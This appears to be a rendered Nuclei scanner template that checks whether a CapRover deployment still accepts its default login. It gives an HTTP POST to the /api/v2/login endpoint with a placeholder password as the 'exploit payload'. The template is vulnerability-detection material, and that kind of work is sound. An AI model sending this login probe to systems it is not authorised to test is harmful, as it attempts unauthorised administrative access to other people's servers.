# Nuclei Template: Caprover - Default Login
**Template ID:** caprover-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`caprover-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Caprover defaultl login has been detected.

## Steps to reproduce / Exploit Payload
```http
POST /api/v2/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
x-namespace: captain

{"password":"{{password}}"}
```

